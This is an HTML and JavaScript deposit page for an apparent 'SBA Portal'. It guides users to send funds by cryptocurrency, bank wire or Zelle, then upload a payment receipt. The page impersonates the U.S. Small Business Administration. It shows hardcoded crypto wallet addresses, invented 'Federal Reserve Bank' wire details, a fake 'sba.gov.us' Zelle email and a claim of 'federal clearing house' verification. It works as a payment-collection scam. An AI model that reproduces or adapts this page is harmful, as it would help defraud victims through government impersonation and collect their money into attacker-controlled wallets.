<!DOCTYPE html>
<html lang="en" data-theme="light">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Deposit Funds | SBA Portal</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css">
    <link rel="stylesheet" href="global.css">
</head>
<body>

<div id="pageLoader" class="page-loader active"><div class="spinner"></div></div>

<div class="app-layout">
    <aside class="app-sidebar" id="appSidebar"></aside>
    <main class="app-main">
        <div id="pageHeader"></div>
        <div class="app-main__content" style="max-width: 700px;">
            
            <div id="statusView" style="display:none;" class="status-screen">
                <div id="statusIcon" class="status-screen__icon"></div>
                <h1 id="statusTitle" class="status-screen__title"></h1>
                <p id="statusMsg" class="status-screen__message"></p>
                <div id="statusActions"></div>
            </div>

            <div id="depositFlow">
                <!-- STEP 1: METHOD -->
                <div id="step-1" class="deposit-step active">
                    <h3 class="mb-6" style="font-weight:800;">1. Select Payment Method</h3>
                    <div class="method-selector">
                        <div class="method-card" data-method="crypto">
                            <div class="method-card__icon text-warning"><i class="fa-solid fa-bitcoin-sign"></i></div>
                            <div class="method-card__name">Cryptocurrency</div>
                        </div>
                        <div class="method-card" data-method="bank">
                            <div class="method-card__icon text-navy"><i class="fa-solid fa-building-columns"></i></div>
                            <div class="method-card__name">Bank Wire</div>
                        </div>
                        <div class="method-card" data-method="zelle">
                            <div class="method-card__icon text-success"><i class="fa-solid fa-envelope"></i></div>
                            <div class="method-card__name">Zelle</div>
                        </div>
                    </div>
                    <button class="btn btn--primary btn--full" id="toStep2" disabled>Continue to Details</button>
                </div>

                <!-- STEP 2: COIN (ONLY FOR CRYPTO) -->
                <div id="step-crypto" class="deposit-step">
                    <h3 class="mb-6" style="font-weight:800;">2. Select Asset</h3>
                    <div class="coin-grid" id="coinGrid"></div>
                    <div id="networkList" class="mb-6"></div>
                    <button class="btn btn--ghost" onclick="showStep(1)">Back</button>
                </div>

                <!-- STEP 3: ADDRESS & RECEIPT -->
                <div id="step-final" class="deposit-step">
                    <h3 class="mb-6" style="font-weight:800;">Final Step: Payment & Receipt</h3>
                    <div class="address-display" id="addressBox"></div>
                    <form id="depositForm" class="mt-8">
                        <div class="form-group"><label class="form-label">Amount Sent (USD)</label><input type="number" id="d-amt" class="form-input" placeholder="0.00" required></div>
                        <div class="form-group">
                            <label class="form-label">Upload Proof of Payment (Screenshot/Receipt)</label>
                            <div class="upload-area" id="up-receipt">
                                <i class="fa-solid fa-file-invoice-dollar upload-area__icon"></i>
                                <p class="upload-area__label">Click to Upload Receipt</p>
                                <img class="upload-area__preview" id="pre-receipt">
                                <input type="file" id="in-receipt" hidden accept="image/*" required>
                            </div>
                        </div>
                        <div class="flex gap-4">
                            <button type="button" class="btn btn--ghost" onclick="showStep(1)">Start Over</button>
                            <button type="submit" class="btn btn--primary flex-1" id="submitBtn">Confirm Deposit</button>
                        </div>
                    </form>
                </div>
            </div>

        </div>
    </main>
</div>

<script type="module">
    import { updateUserData, serverTimestamp, compressToBase64, notifyAdmins, addLedgerEntry } from './firebase-config.js';
    import { requireAuth, buildSidebar, buildDock, buildPageHeader, initNotificationBadge, showToast, setButtonLoading, copyToClipboard } from './app.js';

    const WALLETS = {
        BTC: { name: 'Bitcoin', icon: 'fa-bitcoin-sign', color: '#f7931a', networks: { 'Bitcoin': 'bc1qrrc86d42pzejhwxxsjfctmjkj7dl52q0j0qy9k' } },
        ETH: { name: 'Ethereum', icon: 'fa-ethereum', color: '#627eea', networks: { 'ERC20': '0x3b424b2999dEF4894f21f1a5bFe89e97Bc21DE1E', 'Base': '0x3b424b2999dEF4894f21f1a5bFe89e97Bc21DE1E' } },
        USDT: { name: 'USDT', icon: 'fa-dollar-sign', color: '#26a17b', networks: { 'TRC20': 'TKZcchSTjdJXEoVZmErwfiSUmZFnh6Tjwx', 'ERC20': '0x3b424b2999dEF4894f21f1a5bFe89e97Bc21DE1E', 'BEP20': '0x3b424b2999dEF4894f21f1a5bFe89e97Bc21DE1E' } }
    };

    requireAuth((user, userData) => {
        buildSidebar({ activeId: 'deposit', userData });
        buildDock({ activeId: 'deposit' });
        buildPageHeader({ title: 'Fund Account', subtitle: 'Add funds to your treasury wallet', backUrl: 'dashboard.html' });
        initNotificationBadge(user.uid);

        if(userData.depositStatus === 'PENDING') {
            document.getElementById('depositFlow').style.display = 'none';
            document.getElementById('statusView').style.display = 'block';
            document.getElementById('statusIcon').innerHTML = '<i class="fa-solid fa-clock fa-spin"></i>';
            document.getElementById('statusIcon').className = 'status-screen__icon status-screen__icon--info';
            document.getElementById('statusTitle').textContent = 'Deposit Pending';
            document.getElementById('statusMsg').textContent = 'Your deposit is being verified by the federal clearing house. Please allow 1-4 hours.';
        }

        let selectedMethod = '', selectedCoin = '', selectedNet = '', receiptB64 = '';

        window.showStep = (n) => {
            document.querySelectorAll('.deposit-step').forEach(s => s.classList.remove('active'));
            if(n === 1) document.getElementById('step-1').classList.add('active');
            if(n === 'crypto') document.getElementById('step-crypto').classList.add('active');
            if(n === 'final') document.getElementById('step-final').classList.add('active');
        };

        document.querySelectorAll('.method-card').forEach(c => {
            c.onclick = () => {
                document.querySelectorAll('.method-card').forEach(x => x.classList.remove('selected'));
                c.classList.add('selected');
                selectedMethod = c.dataset.method;
                document.getElementById('toStep2').disabled = false;
            };
        });

        document.getElementById('toStep2').onclick = () => {
            if(selectedMethod === 'crypto') {
                renderCoins();
                showStep('crypto');
            } else {
                renderLegacyDetails();
                showStep('final');
            }
        };

        function renderCoins() {
            const grid = document.getElementById('coinGrid');
            grid.innerHTML = '';
            Object.entries(WALLETS).forEach(([key, val]) => {
                const btn = document.createElement('div');
                btn.className = 'coin-btn';
                btn.innerHTML = `<i class="fa-solid ${val.icon}" style="color:${val.color}"></i><span class="coin-btn__name">${val.name}</span>`;
                btn.onclick = () => {
                    selectedCoin = key;
                    renderNetworks(val.networks);
                };
                grid.appendChild(btn);
            });
        }

        function renderNetworks(nets) {
            const box = document.getElementById('networkList');
            box.innerHTML = '<p class="form-label mb-3">Select Network</p>';
            Object.entries(nets).forEach(([name, addr]) => {
                const b = document.createElement('button');
                b.className = 'network-btn';
                b.textContent = name;
                b.onclick = () => { selectedNet = name; renderAddress(addr); showStep('final'); };
                box.appendChild(b);
            });
        }

        function renderAddress(addr) {
            const box = document.getElementById('addressBox');
            box.innerHTML = `
                <div class="address-display__label">Send ${selectedCoin} to this ${selectedNet} address:</div>
                <div class="address-display__value" id="addrVal">${addr}</div>
                <button type="button" class="btn btn--secondary btn--sm" onclick="copyAddr()"><i class="fa-solid fa-copy"></i> Copy Address</button>
            `;
            window.copyAddr = () => copyToClipboard(addr);
        }

        function renderLegacyDetails() {
            const box = document.getElementById('addressBox');
            if(selectedMethod === 'bank') {
                box.innerHTML = `<div style="color:white; font-size:0.9rem;"><strong>Treasury Bank Wire</strong><br>Bank: Federal Reserve Bank<br>Route: 021000021<br>Account: SBA-WIRE-${user.uid.substring(0,8)}</div>`;
            } else {
                box.innerHTML = `<div style="color:white; font-size:0.9rem;"><strong>Zelle Payment</strong><br>Email: treasury.disbursement@sba.gov.us<br>Memo: ${userData.fullName}</div>`;
            }
        }

        document.getElementById('up-receipt').onclick = () => document.getElementById('in-receipt').click();
        document.getElementById('in-receipt').onchange = async (e) => {
            receiptB64 = await compressToBase64(e.target.files[0]);
            document.getElementById('pre-receipt').src = receiptB64;
            document.getElementById('pre-receipt').style.display = 'block';
        };

        document.getElementById('depositForm').onsubmit = async (e) => {
            e.preventDefault();
            const btn = document.getElementById('submitBtn');
            setButtonLoading(btn, true);
            const amt = parseFloat(document.getElementById('d-amt').value);
            const payload = { method: selectedMethod, coin: selectedCoin, network: selectedNet, amount: amt, receiptBase64: receiptB64, submittedAt: serverTimestamp() };
            
            await updateUserData(user.uid, { deposit: payload, depositStatus: 'PENDING' });
            await addLedgerEntry(user.uid, { type: 'deposit', amount: amt, description: `Deposit — ${selectedMethod.toUpperCase()}`, status: 'PENDING' });
            await notifyAdmins({ title: 'New Deposit', message: `${userData.fullName} deposited ${formatCurrency(amt)}`, type: 'action' });
            location.reload();
        };
    });
</script>
</body>
</html>
